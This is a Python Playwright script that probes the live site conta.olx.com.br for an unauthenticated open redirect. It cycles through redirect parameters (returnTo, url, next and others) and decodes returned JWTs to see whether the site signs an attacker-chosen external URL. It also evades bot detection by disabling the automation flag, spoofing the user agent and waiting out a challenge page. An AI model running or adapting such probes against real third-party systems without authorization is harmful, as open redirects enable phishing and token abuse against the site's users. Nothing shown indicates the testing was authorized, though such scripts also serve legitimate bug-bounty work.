#!/usr/bin/env python3
"""Test if conta.olx.com.br mints a returnToToken with an attacker-controlled url claim
via query params (unauth open-redirect primitive)."""
import base64, json, time, urllib.parse
from playwright.sync_api import sync_playwright

def b64d(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
def claim_url(tok):
    try: return json.loads(b64d(tok.split(".")[1])).get("url")
    except: return None

EXT="https://example.com/OLXPOC"
# candidate param names + host paths that might mint the token
cands=[
 ("https://conta.olx.com.br/?returnTo="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/?return_to="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/?url="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/?redirect="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/?returnUrl="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/?next="+urllib.parse.quote(EXT)),
 ("https://conta.olx.com.br/favoritos?returnTo="+urllib.parse.quote(EXT)),
]

with sync_playwright() as p:
    ctx=p.chromium.launch_persistent_context(
        user_data_dir="/tmp/olx_prof", channel="chrome", headless=True, locale="pt-BR",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
        args=["--no-sandbox","--disable-dev-shm-usage","--lang=pt-BR","--disable-blink-features=AutomationControlled"])
    pg=ctx.pages[0] if ctx.pages else ctx.new_page()
    # warmup
    pg.goto("https://conta.olx.com.br/",wait_until="domcontentloaded",timeout=40000)
    for _ in range(5):
        if "Attention Required" not in pg.title(): break
        time.sleep(3)
    base_tok=urllib.parse.parse_qs(urllib.parse.urlparse(pg.url).query).get("returnToToken",[None])[0]
    print("baseline minted url claim:", claim_url(base_tok) if base_tok else None)
    for u in cands:
        try:
            pg.goto(u,wait_until="domcontentloaded",timeout=25000)
            final=pg.url
            tok=urllib.parse.parse_qs(urllib.parse.urlparse(final).query).get("returnToToken",[None])[0]
            cu=claim_url(tok) if tok else None
            param=u.split("?")[1].split("=")[0]
            flag="  <<< EXTERNAL!" if cu and "example.com" in cu else ""
            print(f"param={param:12} -> claim_url={cu} land_ext={'example.com' in final}{flag}")
        except Exception as e:
            print(f"{u[:60]} ERR {repr(e)[:60]}")
        time.sleep(1.5)
    ctx.close()
